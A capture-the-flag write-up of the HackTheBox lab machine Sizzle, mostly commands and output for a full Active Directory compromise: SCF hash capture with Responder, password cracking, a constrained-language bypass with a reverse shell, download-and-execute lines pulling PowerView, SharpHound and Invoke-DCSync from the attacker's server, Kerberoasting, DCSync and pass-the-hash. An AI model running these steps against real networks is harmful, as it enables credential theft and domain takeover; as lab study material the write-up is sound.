---
title: "HackTheBox Write-up: Sizzle"
date: 2023-01-28
description: "My write-up for the HackTheBox box named Sizzle"
summary: "My write-up for the HackTheBox box named Sizzle"
tags: ["htb", "writeup", "sizzle"]
---

This is my write-up for the HackTheBox Machine named Sizzle. I have to give a large thanks to the creators of the machine who have put a lot of effort into it, and allowed me and many others to learn a tremendous amount.

Let's get straight into it!

A TCP scan on all ports reveals the following ports as open:
21,53,80,135,139,389,443,445,464,593,636,3268,3269,5986,9389,47001

So let's do a version scan on all these ports:
```bash
$ nmap 10.10.10.103 -sV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5986,9389,47001
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-20 13:55 AEDT
Nmap scan report for 10.10.10.103
Host is up (0.59s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain?
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
5986/tcp  open     ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open     mc-nmf   .NET Message Framing
47001/tcp open     http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=2/20%Time=5C6CC1BB%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

OK, so at first glance, we can see a HTTP(S) server running, an FTP server running, an LDAP and SMB server, and a bunch of other Windows related services.

Let's start with an enumeration of SMB shares using an anonymous login:
```bash
$ smbclient -L ////10.10.10.103// -U anonymous -N

Sharename       Type      Comment
ADMIN$          Disk      Remote Admin

C$              Disk      Default share

CertEnroll      Disk      Active Directory Certificate Services share

Department Shares Disk      

IPC$            IPC       Remote IPC

NETLOGON        Disk      Logon server share 

Operations      Disk      

SYSVOL          Disk      Logon server share

```

So we have a few non-standard shares available to us, including "CertEnroll", "Operations" and "Department Shares".

Let's enumerate HTTP(S) next:
```bash
$ gobuster -u http://10.10.10.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/images (Status: 301)
/Images (Status: 301)
/IMAGES (Status: 301)
```

```bash
$ gobuster -u https://10.10.10.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
/images (Status: 301)
/Images (Status: 301)
/IMAGES (Status: 301)
```

Hmmm nothing useful here. Visiting the home page of http://10.10.10.103 simply shows a GIF of some meat sizzling on a hot surface.

Finally, for enumeration, let's enumerate the FTP server:
```bash
$ ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -al
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> put test.txt 
local: test.txt remote: test.txt
200 PORT command successful.
550 Access is denied.
```

We find no files publicly available on the FTP server, and get an Access Denied error when trying to upload files.

Unfortunately, this is where I was stuck for a while. I enumerated the different SMB shares and the files and folders inside but found nothing that stood out for initial compromise. The following folders were found in the "Department Shares" share:

```bash
$ smbclient \\\\10.10.10.103\\Department\ Shares -U anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul  4 01:22:32 2018
  ..                                  D        0  Wed Jul  4 01:22:32 2018
  Accounting                          D        0  Tue Jul  3 05:21:43 2018
  Audit                               D        0  Tue Jul  3 05:14:28 2018
  Banking                             D        0  Wed Jul  4 01:22:39 2018
  CEO_protected                       D        0  Tue Jul  3 05:15:01 2018
  Devops                              D        0  Tue Jul  3 05:19:33 2018
  Finance                             D        0  Tue Jul  3 05:11:57 2018
  HR                                  D        0  Tue Jul  3 05:16:11 2018
  Infosec                             D        0  Tue Jul  3 05:14:24 2018
  Infrastructure                      D        0  Tue Jul  3 05:13:59 2018
  IT                                  D        0  Tue Jul  3 05:12:04 2018
  Legal                               D        0  Tue Jul  3 05:12:09 2018
  M&A                                 D        0  Tue Jul  3 05:15:25 2018
  Marketing                           D        0  Tue Jul  3 05:14:43 2018
  R&D                                 D        0  Tue Jul  3 05:11:47 2018
  Sales                               D        0  Tue Jul  3 05:14:37 2018
  Security                            D        0  Tue Jul  3 05:21:47 2018
  Tax                                 D        0  Tue Jul  3 05:16:54 2018
  Users                               D        0  Wed Jul 11 07:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Mar 25 12:21:35 2019

		7779839 blocks of size 4096. 2474839 blocks available

```

In the Users directory, we find:
```bash
smb: \> cd Users
smb: \Users\> ls
  .                                   D        0  Wed Jul 11 07:39:32 2018
  ..                                  D        0  Wed Jul 11 07:39:32 2018
  amanda                              D        0  Tue Jul  3 05:18:43 2018
  amanda_adm                          D        0  Tue Jul  3 05:19:06 2018
  bill                                D        0  Tue Jul  3 05:18:28 2018
  bob                                 D        0  Tue Jul  3 05:18:31 2018
  chris                               D        0  Tue Jul  3 05:19:14 2018
  henry                               D        0  Tue Jul  3 05:18:39 2018
  joe                                 D        0  Tue Jul  3 05:18:34 2018
  jose                                D        0  Tue Jul  3 05:18:53 2018
  lkys37en                            D        0  Wed Jul 11 07:39:04 2018
  morgan                              D        0  Tue Jul  3 05:18:48 2018
  mrb3n                               D        0  Tue Jul  3 05:19:20 2018
  Public                              D        0  Wed Sep 26 15:45:32 2018

		7779839 blocks of size 4096. 2474835 blocks available

```

So we now have a bunch of usernames we can use for future steps i.e. amanda, amanda_adm, bill, bob, chris, henry, joe, jose, lkys37en, morgan and mrb3n. We additionally have a Public folder in the Users folder. Thinking about what user the FTP server is running as, it may be possible that we have write privileges to a Public folder. It is likely that the FTP server is running with least level privileges, but that any user is able to write to a Public folder. We try to place a test.txt file to test this hypothesis:

```bash
smb: \Users\Public\> put test.txt 
putting file test.txt as \Users\Public\test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \Users\Public\> ls
  .                                   D        0  Wed Feb 20 17:12:50 2019
  ..                                  D        0  Wed Feb 20 17:12:50 2019
  test.txt                            A        4  Wed Feb 20 17:12:51 2019

```

Perfect! Looks like we have write access to this folder! Now we need to figure out what exploit we can use in such a situation. Googling for "smb share write access exploit" leads us to the following article:
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

The SCF attack involves using placing a specially crafted SCF file on the shared drive. Then the attack requires that a user on the machine open the folder. From the website above: ```"When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file."``` If this is the actual intended vulnerability for initial compromise, then there must be a script running on Sizzle that opens the Public folder. Let's try out the attack and see!

First, we create a SCF file as follows, where 10.10.15.30 is my tun0 IP address:
```bash
$ cat @mytest.scf 
[Shell]
Command=2
IconFile=\\10.10.15.30\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop

```

Note that the SCF filename starts with the @ character so that it comes up as the first file when viewed in a directory browser. We then start [responder](https://github.com/SpiderLabs/Responder) on our attacker machine:
```bash
$ responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.3.9

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C
  
[+] Listening for events...

```

We then upload the SCF file to the Public folder:

```bash
$ smbclient \\\\10.10.10.103\\Department\ Shares -U anonymous -N
smb: \> cd Users\Public
smb: \Users\Public\> put @mytest.scf 
putting file @mytest.scf as \Users\Public\@mytest.scf (0.1 kb/s) (average 0.1 kb/s)

```

Waiting a minute or two, we receive a hash:

```bash
$ responder -I tun0
[SMBv2] NTLMv2-SSP Client   : 10.10.10.103
[SMBv2] NTLMv2-SSP Username : HTB\amanda
[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:a54c47483fcc6a20:CE16D8EC24B20C8B9D347AAC24EA327D:0101000000000000C0653150DE09D20122CDF94B8B490287000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000E2474A4FC02AD635EC39F0E6F8D60B331F2A24C61353E30C14190A558728F30C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310037003100000000000000000000000000

```

Great! We now have HTB\amanda's hash! Let's try crack it! We'll just use the common rockyou.txt wordlist:
```bash
$ cat hash
amanda::HTB:a54c47483fcc6a20:CE16D8EC24B20C8B9D347AAC24EA327D:0101000000000000C0653150DE09D20122CDF94B8B490287000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000E2474A4FC02AD635EC39F0E6F8D60B331F2A24C61353E30C14190A558728F30C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310037003100000000000000000000000000
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)

```

Woot! We have our first credentials!

Now to figure out where to use them...

We try [Impacket's psexec.py](https://github.com/SecureAuthCorp/impacket), but unfortunately we don't find any share that is writable by amanda:
```bash
$ psexec.py HTB/amanda@10.10.10.103 dir
Impacket v0.9.13 - Copyright 2002-2015 Core Security Technologies

Password:
[*] Trying protocol 445/SMB...

[*] Requesting shares on 10.10.10.103.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'CertEnroll' is not writable.
[-] share 'Department Shares' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Operations' is not writable.
[-] share 'SYSVOL' is not writable.

```

Looking through all the open ports again, we could possibly try amanda's credentials on the FTP server, or look at the other windows services such as LDAP on port 3268 or WinRM on port 5968.

I'll save the trouble and skip to what actually worked. It took a lot of researching, but I eventually found some very interesting ways to authenticate and interact with WinRM from a linux machine:
https://blog.rapid7.com/2012/11/08/abusing-windows-remote-management-winrm-with-metasploit/
https://4sysops.com/archives/powershell-remoting-between-windows-and-linux/
https://github.com/masterzen/winrm-cli

But I faced problems with all of these! For example powershell on linux and winrm-cli both seemed to only support basic auth, not NTLM auth:
https://www.reddit.com/r/PowerShell/comments/6q2vs9/how_to_connect_to_winrm_powershell_from_linux/
There may be a way to use powershell on linux with NTLM auth, but it looks painful:
https://www.reddit.com/r/PowerShell/comments/6itek2/powershell_remoting_linux_windows_with_spnego/dkahvnf/

I then also realised that the nmap results for port 5968 mentioned that the service was using SSL. So my WinRM client would also have to support SSL.

Googling for "winrm https client linux", I find the following link: https://krash.be/node/29
Here, the writer recommends using a [Ruby Gem called winrm](https://github.com/WinRb/WinRM) for connecting to WinRM from Linux to Windows. This page has great documentation on writing a client as well, so we set one up using the credentials we have:

```bash
$ cat https-amanda-winrm.rb 
require 'winrm'
opts = { 
  endpoint: 'https://10.10.10.103:5986/wsman',
  user: 'amanda',
  password: 'Ashare1972'
}
conn = WinRM::Connection.new(opts)
conn.shell(:powershell) do |shell|
  output = shell.run('$PSVersionTable') do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end
```

Running this script gives me the following error:

```bash
$ ruby https-amanda-winrm.rb
/usr/lib/ruby/vendor_ruby/httpclient/ssl_socket.rb:103:in `connect': SSL_connect returned=1 errno=0 state=error: certificate verify failed (unable to get local issuer certificate) (OpenSSL::SSL::SSLError)

```

Googling this error, we find that the cause is "when a self-signed certificate cannot be verified", from [here](https://confluence.atlassian.com/bitbucketserverkb/ssl-certificate-problem-unable-to-get-local-issuer-certificate-816521128.html).

Additionally, doing a little more research on WinRM with SSL leads us to the following article from Microsoft:
https://support.microsoft.com/en-au/help/2019527/how-to-configure-winrm-for-https
What's important to us is the following line:
"If you have a Microsoft Certificate server you may be able to request a certificate using the web certificate template from HTTPS://<MyDomainCertificateServer>/certsrv"

So to summarise, we may need a self signed certificate, and a Microsoft certificate server can be used to request a certificate.

When we try visiting http://10.10.10.103/certsrv we actually find that we are provided with a popup asking for credentials. We enter amanda's credentials and are presented with a web page we haven't seen before. It looks like we can use this page to request a certificate! It's odd that we didn't pick up this site before though. (Turned out that certsrv is not in the directory-list-2.3-medium.txt wordlist, but is in dirb's common.txt wordlist - I've put this in my "General approach" cheatsheet for the future!)

When we go to "Request a Certificate" and then to "Advanced certificate request" we see that we can submit a Certificate Signing Request (CSR) to have our private key signed by the server. The advanced certificate request page is at: http://10.10.10.103/certsrv/certrqxt.asp

We can create our own private key with a CSR using the following command:
```bash
$ openssl req -new -newkey rsa:2048 -nodes -out dev.csr -keyout dev.key
```

The above command outputs a private key (dev.key) and a CSR (dev.csr). We can submit the contents of the CSR (including the header and footer) to the Advanced Certificate Request page, and the server will create a certificate for us with a signature approving our private key. We retrieve "certnew.cer" from the server and now should be able to use this for authentication to WinRM. Note that because we logged in to the certsrv portal with amanda's credentials, the private key should now be linked with amanda's account.

Referencing code from the Ruby gem's page again, we set up the following code for authenticating to WinRM using a private key and certificate:
```bash
$ cat shell-winrm.rb 
require 'winrm'

opts = { 
endpoint: 'https://10.10.10.103:5986/wsman',
transport: :ssl,
:client_cert => 'certnew.cer',
:client_key => 'dev.key',
:no_ssl_peer_verification => true
}

command=""
conn = WinRM::Connection.new(opts)

conn.shell(:powershell) do |shell|
until command == "exit\n" do
print "PS > "
command = gets
output = shell.run(command) do |stdout, stderr|
STDOUT.print stdout
STDERR.print stderr
end
end
puts "Exiting with code #{output.exitcode}"
end
```

Running this code we get our first shell!
```bash
$ ruby shell-winrm.rb 
PS > whoami
htb\amanda
```

---

OK although we did all that work to get our first shell, unfortunately we still don't have user.txt! Looking around in Amanda's desktop, Documents folder, and Downloads folder, we find nothing of interest.

Let's do some enumeration, starting with ```systeminfo``` and looking at the list of other users on the system:

```bash
$ ruby shell-winrm.rb 
PS > whoami
htb\amanda
PS > systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
PS > net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            amanda                   DefaultAccount           
Guest                    krbtgt                   mrlky                    
sizzler                  
The command completed with one or more errors.

```

Interestingly, we aren't allowed to run systeminfo! However, there is a user called sizzler, and another one called krbtgt which straight away stick out. The sizzler account is similar to the name of the machine, and the krbtgt user means that Kerberos authentication is most likely enabled. From our perspective, it means Kerberoasting may be an option to laterally compromise another user.

I would recommend [Tim Medin's talk on Kerberoasting](https://www.youtube.com/watch?v=PUyhlN-E5MU) as it explains exactly how it works. His [slides](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf) are also available online. To put it simply, Kerberoasting involves requesting kerberos tickets for services. Part of these tickets may be encrypted with the RC4 algorithm where the private key is the "Kerberos TGS-REP etype 23 hash of the service account associated with the SPN". More details can be found on the MITRE ATT&CK page [here](https://attack.mitre.org/techniques/T1208/). If there is an account associated with an SPN, and has a weak password, we may be able to crack its hash and get back the password.

To start with, we can try to import PowerView into powershell to allow us to use the Invoke-Kerberoast function. PowerView started [supporting Kerberoasting](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/) a few years ago. So let's try downloading the PowerView.PS1 script onto the box with powershell and then importing it. We can use ```# python -m SimpleHTTPServer 8081``` to start a web server to serve our scripts, and we can get PowerView.PS1 from the [PowerSploit github repo](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1). Note that the main branch version doesn't have Invoke-Kerberoast as yet, but the one I linked does. Our result is as follows:

```bash
$ ruby shell-winrm.rb 
PS > Invoke-WebRequest -Uri "http://10.10.15.30:8081/PowerView.ps1" -OutFile "C:\Users\amanda\Documents\PV.ps1"
PS > Import-Module C:\Users\amanda\Documents\PV.ps1
Importing *.ps1 files as modules is not allowed in ConstrainedLanguage mode.
At line:1 char:1
+ Import-Module C:\Users\amanda\Documents\PV.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [Import-Module], InvalidOperationException
    + FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.ImportModuleCommand
```

Unfortunately, we get a permission denied error when trying to import PowerView. The error is caused by a feature of PowerShell called "Constrained Language Mode", where not all powershell features are allowed to be performed.

I know there is also a way to directly download and import the PS1 script into memory without needing to store the PS1 file on disk, so we can try that too:

```bash
PS > iex (new-object net.webclient).DownloadString('http://10.10.15.30:8081/PowerView.ps1')
Cannot create type. Only core types are supported in this language mode.
At line:1 char:6
+ iex (new-object net.webclient).DownloadString('http://10.10.15.30:808 ...
+      ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [New-Object], PSNotSupportedException
    + FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand
```

That didn't work either! Looks like we will have to bypass powershell constrained mode first before moving forward.

Researching a bit on bypassing powershell constrained mode, we find two common ways to bypass it:
* Use powershell -v2 to spawn a new process with a [downgraded version of powershell](https://ired.team/offensive-security/powershell-constrained-language-mode-bypass) which doesnt support constrained mode
* Use [padovah4ck's executable](https://github.com/padovah4ck/PSByPassCLM) for bypassing constrained mode and getting a shell with full language mode enabled

Let's git clone padovahh4ck's repo and run the following commands to get ourselves a reverse shell with powershell full language mode:

```bash
PS > Invoke-WebRequest -Uri "http://10.10.15.30:8081/PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe" -OutFile "C:\Users\amanda\Documents\bp.exe"

PS > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.15.30 /rport=443 /U C:\Users\amanda\Documents\bp.exe
```

And we get a shell on port 443:

```bash
$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.15.30] from (UNKNOWN) [10.10.10.103] 60970
PS C:\Users\amanda\Documents> $ExecutionContext.SessionState.LanguageMode
FullLanguage
PS C:\Users\amanda\Documents> whoami
htb\amanda

```

As we can see above, we now have a shell with FullLanguage mode enabled! Now we can import PowerView again:

```bash
PS C:\Users\amanda\Documents> iex (new-object net.webclient).DownloadString('http://10.10.15.30:8081/PowerView.ps1')
```

To use Invoke-Kerberoast, it's important that our current shell has amanda's kerberos token in memory so that it can be used to request tickets from the domain controller. We run the following commands to perform the kerberoast attack:

```bash
PS C:\Users\amanda\Documents> $SecPassword = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
PS C:\Users\amanda\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $SecPassword)
PS C:\Users\amanda\Documents> Invoke-UserImpersonation -Credential $Cred
PS C:\Users\amanda\Documents> Invoke-Kerberoast -OutputFormat Hashcat | fl
```

Again it should be noted that we need a special version of PowerView which includes Invoke-UserImpersonation and Invoke-Kerberoast as found [here](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1). An example of using Invoke-UserImpersonation can be found on line [2065](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1#L2065). The output of Invoke-Kerberoast returns us a kerberos ticket signed with mrlky's hash:

```bash
PS C:\Users\amanda\Documents> Invoke-Kerberoast -OutputFormat Hashcat | fl

SamAccountName       : mrlky
DistinguishedName    : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
ServicePrincipalName : http/sizzle
Hash                 : $krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdsa,DC=pf,DC=fakedomain,DC=com SPN: E0518235-4B06-11D1-AB04-00C04FDS3CD2-BADM/aksjdb.asdsa.pf.fakedomain.com:50000 *506FB86544C2EE265DC9AA32129D4294$9472892CFAD15F5B2604A2F388EFE8BD80E9BE8FA74D6ED40A122475CC18F53F86F536A34544A9B5878E26DE76B309D54A47F594085793EBCB78B4CF444EBE8B8942192773E6FAE540FF2EF5366FF701007F69A9D64C5BD9D820BD9610EFA87A
<-----snip----->

```

I decided to use the ```-OutputFormat Hashcat``` option as I found it easier to crack the hash with hashcat. However, I have to edit the hash a little bit, and looking at hashcat's [list of example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us the format hashcat expects. So we edit the starting of the hash as follows, and then run hashcat to crack it:

```bash
$ cat hashcat-hash 
$krb5tgs$23$*user$realm$test/spn*$506FB86544C2EE265DC9AA32129D4294$9472892CFAD15F5B2604A2F388EFE8BD80E9BE8FA74D6ED40A12247
<-----snip----->
$ hashcat -m 13100 hashcat-hash /usr/share/wordlists/rockyou.txt --force

$krb5tgs$23$*user$realm$test/spn*$506fb86544c2ee265dc9aa32129d4294$9472892cfad15f5b2604a2f388efe8bd80e9be8fa74d6ed40a12247
<-----snip----->
2f9dc27674a0a5f1ade5990:Football#7

```

We now have the following creds!  ```mrlky:Football#7```
We can perform the same steps as we did for amanda to get a shell as mrlky:
1. create a private key and CSR using openssl
2. login to the /certsrv portal and login using mrlky's credentials
3. submit the CSR and get back a certificate showing that the private key is signed by the certificate server
4. use the winrm ruby library to get a shell as mrlky

```bash
$ cat shell-winrm-mrlky.rb 
require 'winrm'

opts = { 
endpoint: 'https://10.10.10.103:5986/wsman',
transport: :ssl,
:client_cert => 'mrlky.cer',
:client_key => 'mrkly.key',
:no_ssl_peer_verification => true
}

command=""
conn = WinRM::Connection.new(opts)

conn.shell(:powershell) do |shell|
until command == "exit\n" do
print "PS > "
command = gets
output = shell.run(command) do |stdout, stderr|
STDOUT.print stdout
STDERR.print stderr
end
end
puts "Exiting with code #{output.exitcode}"
end
```

Running this ruby script gets us a shell from which we can retrieve user.txt:

```bash
$ ruby shell-winrm-mrlky.rb
PS > whoami
htb\mrlky

PS > pwd
Path                  
----                  
C:\Users\mrlky\Desktop
PS > type user.txt
a6ca1f8*************************

```

FINALLY! :D

---

So, let's now move on to privesc!

There are a couple of scripts we can try to look for Windows privilege escalation vectors e.g. PowerUp, BloodHound / SharpHound, or [JAWS](https://github.com/411Hall/JAWS). PowerUp is for a local machine, while BloodHound is useful for privilege escalating in a domain environment. JAWS is a Windows enumeration script. As PowerUp didn't find anything useful for me, I'll skip to how I got BloodHound working:


BloodHound requires us to first gather information from the compromised host. A tool called SharpHound includes scripts for gathering this information and can be found [here](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors).

We use our FullLanguage mode shell to import this ingestor in memory and run it:

```bash
PS C:\Users\mrlky.HTB\Documents> iex (new-object net.webclient).DownloadString('http://10.10.15.30:8081/BloodHound/Ingestors/SharpHound.ps1')
PS C:\Users\mrlky.HTB\Documents> Invoke-BloodHound

```

Unfortunately, our shell just crashes! The script seems to fail silently in the background and doesn't produce any files on the filesystem.

Even trying powershell -v2 failed us, however the error below seems to be caused by a bug in the SharpHound script itself:

```bash
$ ruby shell-winrm-mrlky.rb
PS > powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.30:8081/BloodHound/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
powershell.exe : Invoke : Exception calling "Invoke" with "2" argument(s): "Attempted to read or write protected memory. This is often an indication that other memory is corrupt."

```

As this isn't working, I started looking for other versions of SharpHound and stumbled across [this one](https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/credentials/Bunnyhound/SharpHound.ps1) hosted in hak5's github repo. This script worked using powershell -v2 for bypassing constrained mode:

```bash
PS > powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.30:8081/bashbunny-payloads/payloads/library/credentials/Bunnyhound/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"
Initializing BloodHound at 9:17 PM on 3/25/2019
Starting Default enumeration for HTB.LOCAL
Status: 57 objects enumerated (+57 5.181818/s --- Using 73 MB RAM )
Finished enumeration for HTB.LOCAL in 00:00:11.7898754
<-----snip----->

```

Great! We now have a bunch of CSV files as output showing us useful information about the Active Directory environment:

```bash
PS > ls
    Directory: C:\Users\mrlky\Downloads
Mode                LastWriteTime         Length Name                         
----                -------------         ------ ----                         
-a----        3/28/2019   2:18 AM          38482 acls.csv                     
-a----        3/28/2019   2:18 AM           5931 BloodHound.bin               
-a----        3/28/2019   2:18 AM            229 computer_props.csv           
-a----        3/28/2019   2:18 AM            354 container_gplinks.csv       
-a----        3/28/2019   2:18 AM           1300 container_structure.csv     
-a----        3/28/2019   2:18 AM           2359 group_membership.csv         
-a----        3/28/2019   2:18 AM            185 local_admins.csv             
-a----        3/28/2019   2:18 AM             61 sessions.csv                 
-a----        3/28/2019   2:18 AM            920 user_props.csv

```

Having a look at the ACLs file, we can filter for the current user we have and see what access they have:

```bash
PS > type acls.csv | findstr MRLKY
MRLKY@HTB.LOCAL,user,DOMAIN ADMINS@HTB.LOCAL,group,Owner,,AccessAllowed,False,
MRLKY@HTB.LOCAL,user,DOMAIN ADMINS@HTB.LOCAL,group,GenericAll,,AccessAllowed,False,
MRLKY@HTB.LOCAL,user,Account Operators@HTB.LOCAL,GROUP,GenericAll,,AccessAllowed,False,
MRLKY@HTB.LOCAL,user,ENTERPRISE ADMINS@HTB.LOCAL,group,GenericAll,,AccessAllowed,True,
MRLKY@HTB.LOCAL,user,Administrators@HTB.LOCAL,GROUP,WriteOwner,,AccessAllowed,True,
MRLKY@HTB.LOCAL,user,Administrators@HTB.LOCAL,GROUP,WriteDacl,,AccessAllowed,True,
HTB.LOCAL,domain,MRLKY@HTB.LOCAL,user,ExtendedRight,DCSync,,False,
HTB.LOCAL,domain,MRLKY@HTB.LOCAL,user,ExtendedRight,GetChanges,,False,
HTB.LOCAL,domain,MRLKY@HTB.LOCAL,user,ExtendedRight,GetChangesAll,,False,

```

From the above, we see three special ExtendedRights that have been allocated to our user! Specifically, the GetChanges Access Control Entry, the GetChangesAll entry and the DCSync entry.

The one that stands out straight away is DCSync! Using DCSync, which effectively "impersonates" a Domain Controller, we can request account password data from the targeted Domain Controller. Effectively, this access allows us to replicate the data from a domain controller (hence "sync"). We can use the [Invoke-DCSync script](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1) to utilise this feature:

```bash
PS > powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.30:8081/Invoke-DCSync.ps1'); Invoke-DCSync | Format-Table -Wrap"
<-----snip----->
Domain                   User                     ID                       Hash                   
------                   ----                     --                       ----                   
HTB.LOCAL                krbtgt                   502                      296ec447eee58283143efbd5d39408c8              
HTB.LOCAL                Administrator            500                      f6b7160bfc91823792e0ac3a162c9267              
HTB.LOCAL                Guest                    501                      -                      
HTB.LOCAL                amanda                   1104                     7d0516ea4b6ed084f3fdf71c47d9beb3              
HTB.LOCAL                mrlky                    1603                     bceef4f6fe9c026d1d8dec8dce48adef              
HTB.LOCAL                sizzler                  1604                     d79f820afad0cbc828d79e16a6f890de

```

WOOT! We now have the hashes for each user! And we use Administrator's hash to get root.txt:

```bash
$ wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 Administrator@10.10.10.103
Impacket v0.9.13 - Copyright 2002-2015 Core Security Technologies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator

C:\Users\administrator\Desktop>type root.txt
91c5849*************************

```

All done! What a learning experience! Thank you to @mrb3n and @lkys37en for such an amazing box.

I hope you all enjoyed the write-up!

---
Live and Learn!

Many tools for Pass-The-Hash attacks: https://www.hacklikeapornstar.com/all-pth-techniques/

Common Active Directory Attacks: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md


